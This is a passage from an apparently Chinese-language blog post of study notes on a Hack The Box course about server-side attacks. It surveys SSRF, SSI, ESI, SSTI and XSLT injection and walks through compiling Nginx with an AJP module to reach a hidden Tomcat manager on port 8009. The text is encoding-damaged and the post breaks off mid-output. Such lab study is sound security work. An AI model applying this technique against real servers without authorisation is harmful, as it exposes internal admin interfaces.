<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ServersideAttacksHTB | Mikannseã®Sekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction to Server-Side AttacksæœåŠ¡å™¨ç«¯æ”»å‡»çš„ç›®æ ‡æ˜¯æœåŠ¡å™¨æä¾›çš„åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ï¼Œè€Œå®¢æˆ·ç«¯æ”»å‡»çš„ç›®çš„æ˜¯æ”»å‡»å®¢æˆ·ç«¯ã€‚ç†è§£å’Œè¯†åˆ«è¿™äº›å·®å¼‚å¯¹äºæ¸—é€æµ‹è¯•å’Œbugèµé‡‘çŒäººæ¥è¯´æ˜¯è‡³å…³é‡è¦çš„ã€‚ ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œåº”è¯¥æœ‰åŠ©äºæ¾„æ¸…æœåŠ¡å™¨ç«¯æ”»å‡»ä¸å®¢æˆ·ç«¯æ”»å‡»ä¹‹é—´çš„å·®å¼‚æ˜¯Cross-Site Request Forgeries (CSRF)å’ŒServer-side Request For">
<meta property="og:type" content="article">
<meta property="og:title" content="ServersideAttacksHTB">
<meta property="og:url" content="http://mikannse.space/2023/10/30/ServersideAttacksHTB/index.html">
<meta property="og:site_name" content="Mikannseã®Sekai">
<meta property="og:description" content="Introduction to Server-Side AttacksæœåŠ¡å™¨ç«¯æ”»å‡»çš„ç›®æ ‡æ˜¯æœåŠ¡å™¨æä¾›çš„åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ï¼Œè€Œå®¢æˆ·ç«¯æ”»å‡»çš„ç›®çš„æ˜¯æ”»å‡»å®¢æˆ·ç«¯ã€‚ç†è§£å’Œè¯†åˆ«è¿™äº›å·®å¼‚å¯¹äºæ¸—é€æµ‹è¯•å’Œbugèµé‡‘çŒäººæ¥è¯´æ˜¯è‡³å…³é‡è¦çš„ã€‚ ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œåº”è¯¥æœ‰åŠ©äºæ¾„æ¸…æœåŠ¡å™¨ç«¯æ”»å‡»ä¸å®¢æˆ·ç«¯æ”»å‡»ä¹‹é—´çš„å·®å¼‚æ˜¯Cross-Site Request Forgeries (CSRF)å’ŒServer-side Request For">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2023-10-30T14:34:41.000Z">
<meta property="article:modified_time" content="2024-09-04T08:50:15.966Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="ç½‘å®‰">
<meta property="article:tag" content="ç¬”è®°">
<meta property="article:tag" content="æ¸—é€æµ‹è¯•">
<meta property="article:tag" content="SSTI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/10/30/ServersideAttacksHTB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":50,"languages":{"author":"ä½œè€…: Mikannse","link":"é“¾æ¥: ","source":"æ¥æº: Mikannseã®Sekai","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ServersideAttacksHTB',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-09-04 16:50:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">åŠ è½½ä¸­...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">308</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ–‡ç« </span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Mikannseã®Sekai"><span class="site-name">Mikannseã®Sekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ–‡ç« </span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ServersideAttacksHTB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-10-30T14:34:41.000Z" title="å‘è¡¨äº 2023-10-30 22:34:41">2023-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-09-04T08:50:15.966Z" title="æ›´æ–°äº 2024-09-04 16:50:15">2024-09-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">ç½‘å®‰</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">28.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>146åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ServersideAttacksHTB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction-to-Server-Side-Attacks"><a href="#Introduction-to-Server-Side-Attacks" class="headerlink" title="Introduction to Server-Side Attacks"></a>Introduction to Server-Side Attacks</h1><p>æœåŠ¡å™¨ç«¯æ”»å‡»çš„ç›®æ ‡æ˜¯æœåŠ¡å™¨æä¾›çš„åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ï¼Œè€Œå®¢æˆ·ç«¯æ”»å‡»çš„ç›®çš„æ˜¯æ”»å‡»å®¢æˆ·ç«¯ã€‚ç†è§£å’Œè¯†åˆ«è¿™äº›å·®å¼‚å¯¹äºæ¸—é€æµ‹è¯•å’Œbugèµé‡‘çŒäººæ¥è¯´æ˜¯è‡³å…³é‡è¦çš„ã€‚</p>
<p>ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œåº”è¯¥æœ‰åŠ©äºæ¾„æ¸…æœåŠ¡å™¨ç«¯æ”»å‡»ä¸å®¢æˆ·ç«¯æ”»å‡»ä¹‹é—´çš„å·®å¼‚æ˜¯<code>Cross-Site Request Forgeries (CSRF)</code>å’Œ<code>Server-side Request Forgeries (SSRF)</code>ã€‚è¿™ä¸¤ç§æ”»å‡»éƒ½æ¶‰åŠWebæœåŠ¡å™¨ä»¥åŠæœåŠ¡å™¨å¦‚ä½•å¤„ç†URLã€‚ç„¶è€Œï¼ŒCSRFå’ŒSSRFæœ‰ä¸åŒçš„ç›®æ ‡å’Œç›®çš„ã€‚</p>
<p>å¤§è‡´å¼•ç”¨è‡ª<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/course/preview/introduction-to-web-applications">Webåº”ç”¨ç¨‹åºç®€ä»‹</a>æ¨¡å—ä¸­çš„è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ éƒ¨åˆ†ï¼š</p>
<p> CSRFæ”»å‡»å¯èƒ½åˆ©ç”¨å…¶ä»–å®¢æˆ·ç«¯æ”»å‡»ï¼ˆå¦‚XSSæ¼æ´ï¼‰å‘å—å®³è€…å·²é€šè¿‡èº«ä»½éªŒè¯çš„Webåº”ç”¨ç¨‹åºæ‰§è¡Œè¯·æ±‚ã€‚è¿™å…è®¸æ”»å‡»è€…ä»¥æˆæƒç”¨æˆ·çš„èº«ä»½æ‰§è¡Œæ“ä½œï¼Œä¾‹å¦‚å°†å…¶å¯†ç æ›´æ”¹ä¸ºæ”»å‡»è€…å¯èƒ½çŸ¥é“çš„å†…å®¹ï¼Œæˆ–è€…ä»¥å—å®³è€…çš„èº«ä»½æ‰§è¡Œä»»ä½•æœªç»æˆæƒçš„æ“ä½œã€‚ </p>
<p>ä»ä¸Šè¿°æƒ…å†µï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥æ¨æ–­å‡ºç›®æ ‡æ˜¯å®¢æˆ·ã€‚æœåŠ¡å™¨ç«¯æ”»å‡»çš„ç›®æ ‡æ˜¯å®é™…çš„åº”ç”¨ç¨‹åºï¼Œç›®æ ‡æ˜¯æ³„æ¼æ•æ„Ÿæ•°æ®æˆ–å°†æœªç»æˆæƒçš„è¾“å…¥æ³¨å…¥åº”ç”¨ç¨‹åºï¼Œç”šè‡³å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚è¿™ç§æƒ…å†µä¸‹çš„ç›®æ ‡æ˜¯åç«¯æœåŠ¡ã€‚</p>
<h2 id="Types-of-Server-Side-Attacks"><a href="#Types-of-Server-Side-Attacks" class="headerlink" title="Types of Server-Side Attacks"></a>Types of Server-Side Attacks</h2><p>æœ¬æ¨¡å—å°†ä»‹ç»ä¸åŒç±»å‹çš„æœåŠ¡å™¨ç«¯æ”»å‡»ä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒä»¬ã€‚è¿™äº›æªæ–½æ˜¯ï¼š</p>
<ul>
<li><code>Abusing Intermediary Applications</code>ï¼šé€šè¿‡åˆ©ç”¨ç‰¹å®šçš„å…¬å¼€äºŒè¿›åˆ¶åè®®ï¼Œé˜²æ­¢å†…éƒ¨åº”ç”¨ç¨‹åºæ— æ³•ä»æˆ‘ä»¬çš„ç½‘ç»œè®¿é—®ã€‚</li>
<li><code>Server-Side Request Forgery (SSRF)</code>ï¼šä½¿å®¿ä¸»åº”ç”¨ç¨‹åºæœåŠ¡å™¨å‘ä»»æ„å¤–éƒ¨åŸŸæˆ–å†…éƒ¨èµ„æºå‘å‡ºè¯·æ±‚ï¼Œä»¥å°è¯•è¯†åˆ«æ•æ„Ÿæ•°æ®ã€‚</li>
<li><code>Server-Side Includes Injection (SSI)</code>ï¼šæ³¨å…¥ä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œä»¥ä¾¿æ¶æ„çš„æœåŠ¡å™¨ç«¯åŒ…å«æŒ‡ä»¤è¢«è§£æï¼Œä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–æ³„æ¼æ•æ„Ÿæ•°æ®ã€‚å½“æœªç»å……åˆ†éªŒè¯çš„ç”¨æˆ·è¾“å…¥è®¾æ³•æˆä¸ºä¸ºæœåŠ¡å™¨ç«¯IncludeæŒ‡ä»¤åˆ†æçš„å“åº”çš„ä¸€éƒ¨åˆ†æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤æ¼æ´ã€‚</li>
<li><code>Edge-Side Includes Injection (ESI)</code>ï¼šESIæ˜¯ä¸€ç§åŸºäºXMLçš„æ ‡è®°è¯­è¨€ï¼Œç”¨äºé€šè¿‡ä¸´æ—¶å­˜å‚¨å¸¸è§„Webç¼“å­˜åè®®æ— æ³•ä¿å­˜çš„åŠ¨æ€Webå†…å®¹æ¥è§£å†³æ€§èƒ½é—®é¢˜ã€‚å½“æ”»å‡»è€…è®¾æ³•åœ¨HTTPå“åº”ä¸­åæ˜ æ¶æ„çš„ESIæ ‡è®°æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¾¹ç¼˜ä¾§åŒ…å«æ³¨å…¥ã€‚æ­¤æ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯HTTPä»£ç†æ— æ³•éªŒè¯ESIæ ‡è®°æ¥æºã€‚ä»–ä»¬å°†å¾ˆä¹æ„è§£æå’Œè¯„ä¼°ä¸Šæ¸¸æœåŠ¡å™¨æä¾›çš„åˆæ³•ESIæ ‡è®°ä»¥åŠæ”»å‡»è€…æä¾›çš„æ¶æ„ESIæ ‡è®°ã€‚</li>
<li><code>Server-Side Template Injection (SSTI)</code>ï¼šæ¨¡æ¿å¼•æ“é€šè¿‡ç½‘é¡µæˆ–ç”µå­é‚®ä»¶ä¿ƒè¿›åŠ¨æ€æ•°æ®å‘ˆç°ã€‚æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æœ¬è´¨ä¸Šæ˜¯åœ¨æ¨¡æ¿ä¸­æ³¨å…¥æ¶æ„çš„æ¨¡æ¿æŒ‡ä»¤ï¼ˆæœ‰æ•ˆè´Ÿè½½ï¼‰ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“å°†ç”¨æˆ·è¾“å…¥ä¸ç»™å®šæ¨¡æ¿ä¸å®‰å…¨åœ°æ··åˆåœ¨ä¸€èµ·ã€‚</li>
<li><code>Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)</code>ï¼šXMLæ˜¯ä¸€ç§åŸºäºXMLçš„è¯­è¨€ï¼Œé€šå¸¸ç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢ä¸ºHTMLã€å¦ä¸€ä¸ªXMLæ–‡æ¡£æˆ–PDFã€‚å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢æœåŠ¡å™¨ç«¯æ³¨å…¥å¯èƒ½å‘ç”Ÿåœ¨å¯ä»¥ä¸Šè½½ä»»æ„XSLæ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºä½¿ç”¨æ¥è‡ªç”¨æˆ·çš„æœªç»éªŒè¯çš„è¾“å…¥åŠ¨æ€ç”ŸæˆXSLè½¬æ¢çš„XMLæ–‡æ¡£æ—¶ã€‚</li>
</ul>
<h1 id="Abusing-Intermediary-Applications"><a href="#Abusing-Intermediary-Applications" class="headerlink" title="Abusing Intermediary Applications"></a>Abusing Intermediary Applications</h1><h2 id="Nginx-Reverse-Proxy-amp-AJP"><a href="#Nginx-Reverse-Proxy-amp-AJP" class="headerlink" title="Nginx Reverse Proxy &amp; AJP"></a>Nginx Reverse Proxy &amp; AJP</h2><p>å½“æˆ‘ä»¬é‡åˆ°ä¸€ä¸ªå¼€æ”¾çš„AJPä»£ç†ç«¯å£ï¼ˆ8009 TCPï¼‰æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Nginxå’Œ<code>ajp_module</code>æ¥è®¿é—®â€œéšè—çš„â€Tomcatç®¡ç†å™¨ã€‚è¿™å¯ä»¥é€šè¿‡ç¼–è¯‘Nginxæºä»£ç å¹¶æ·»åŠ æ‰€éœ€çš„æ¨¡å—æ¥å®Œæˆï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<ul>
<li>ä¸‹è½½Nginxæºä»£ç </li>
<li>ä¸‹è½½æ‰€éœ€æ¨¡å—</li>
<li>ä½¿ç”¨<code>ajp_module</code>ç¼–è¯‘Nginxæºä»£ç ã€‚</li>
<li>åˆ›å»ºæŒ‡å‘AJPç«¯å£çš„é…ç½®æ–‡ä»¶</li>
</ul>
<h4 id="ä¸‹è½½Nginxæºç "><a href="#ä¸‹è½½Nginxæºç " class="headerlink" title="ä¸‹è½½Nginxæºç "></a>ä¸‹è½½Nginxæºç </h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz</span><br><span class="line">mikannse7@htb[/htb]$ tar -xzvf nginx-1.21.3.tar.gz</span><br></pre></td></tr></tbody></table></figure>

<h4 id="ä½¿ç”¨ajpæ¨¡å—ç¼–è¯‘Nginxæºä»£ç "><a href="#ä½¿ç”¨ajpæ¨¡å—ç¼–è¯‘Nginxæºä»£ç " class="headerlink" title="ä½¿ç”¨ajpæ¨¡å—ç¼–è¯‘Nginxæºä»£ç "></a>ä½¿ç”¨ajpæ¨¡å—ç¼–è¯‘Nginxæºä»£ç </h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ git clone https://github.com/dvershinin/nginx_ajp_module.git</span><br><span class="line">mikannse7@htb[/htb]$ cd nginx-1.21.3</span><br><span class="line">mikannse7@htb[/htb]$ sudo apt install libpcre3-dev</span><br><span class="line">mikannse7@htb[/htb]$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules</span><br><span class="line">mikannse7@htb[/htb]$ make</span><br><span class="line">mikannse7@htb[/htb]$ sudo make install</span><br><span class="line">mikannse7@htb[/htb]$ nginx -V</span><br><span class="line"></span><br><span class="line">nginx version: nginx/1.21.3</span><br><span class="line">built by gcc 10.2.1 20210110 (Debian 10.2.1-6)</span><br><span class="line">configure arguments: --add-module=../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules</span><br></pre></td></tr></tbody></table></figure>

<p><strong>æ³¨æ„ï¼š</strong>åœ¨ä¸‹é¢çš„é…ç½®ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ç«¯å£8009ï¼Œè¿™æ˜¯Tomcatçš„AJPé»˜è®¤ç«¯å£ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨çœŸå®çš„ç¯å¢ƒä¸­ä½¿ç”¨å®ƒçš„æ–¹å¼ã€‚ä½†æ˜¯ï¼Œè¦å®Œæˆæœ¬èŠ‚æœ«å°¾çš„ç»ƒä¹ ï¼Œæ‚¨åº”è¯¥æŒ‡å®šè¦ç”Ÿæˆçš„ç›®æ ‡çš„IPå’Œç«¯å£ï¼ˆå®ƒä»¬éƒ½å°†åœ¨â€œTargetï¼šâ€œæ—è¾¹å¯è§ï¼‰ã€‚æ‚¨å°†çœ‹åˆ°çš„ç«¯å£å®é™…ä¸Šæ˜ å°„åˆ°åº•å±‚Dockerå®¹å™¨çš„ç«¯å£8009ã€‚</p>
<p>æ³¨é‡Šæ‰æ•´ä¸ª<code>server</code>å—ï¼Œå¹¶å°†ä»¥ä¸‹è¡Œé™„åŠ åˆ°<code>http</code>ä¸­çš„<code>/etc/nginx/conf/nginx.conf</code>å—ä¸­ã€‚</p>
<h4 id="æŒ‡å‘AJPç«¯å£"><a href="#æŒ‡å‘AJPç«¯å£" class="headerlink" title="æŒ‡å‘AJPç«¯å£"></a>æŒ‡å‘AJPç«¯å£</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">upstream tomcats {</span><br><span class="line">	server &lt;TARGET_SERVER&gt;:8009;</span><br><span class="line">	keepalive 10;</span><br><span class="line">	}</span><br><span class="line">server {</span><br><span class="line">	listen 80;</span><br><span class="line">	location / {</span><br><span class="line">		ajp_keep_conn on;</span><br><span class="line">		ajp_pass tomcats;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><strong>æ³¨æ„ï¼š</strong>å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯Pwnboxï¼Œé‚£ä¹ˆç«¯å£80å°†å·²ç»åœ¨ä½¿ç”¨ä¸­ï¼Œå› æ­¤ï¼Œåœ¨ä¸Šè¿°é…ç½®ä¸­å°†ç«¯å£80æ›´æ”¹ä¸º8080ã€‚æœ€åï¼Œåœ¨ä¸‹ä¸€æ­¥ä¸­ï¼Œä½¿ç”¨ç«¯å£8080å’ŒcURLã€‚</p>
<p>å¯åŠ¨Nginxå¹¶é€šè¿‡å‘æœ¬åœ°ä¸»æœºå‘å‡ºcURLè¯·æ±‚æ¥æ£€æŸ¥æ˜¯å¦ä¸€åˆ‡æ­£å¸¸ã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nginx</span><br><span class="line">mikannse7@htb[/htb]$ curl http://127.0.0.1:80</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset="UTF-8" /&gt;</span><br><span class="line">        &lt;title&gt;Apache Tomcat/X.X.XX&lt;/title&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="shortcut icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="tomcat.css" rel="stylesheet" type="text/css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id="wrapper"&gt;</span><br><span class="line">            &lt;div id="navigation" class="curved container"&gt;</span><br><span class="line">                &lt;span id="nav-home"&gt;&lt;a href="https://tomcat.apache.org/"&gt;Home&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-hosts"&gt;&lt;a href="/docs/"&gt;Documentation&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-config"&gt;&lt;a href="/docs/config/"&gt;Configuration&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-examples"&gt;&lt;a href="/examples/"&gt;Examples&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-wiki"&gt;&lt;a href="https://wiki.apache.org/tomcat/FrontPage"&gt;Wiki&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-lists"&gt;&lt;a href="https://tomcat.apache.org/lists.html"&gt;Mailing Lists&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-help"&gt;&lt;a href="https://tomcat.apache.org/findhelp.html"&gt;Find Help&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;br 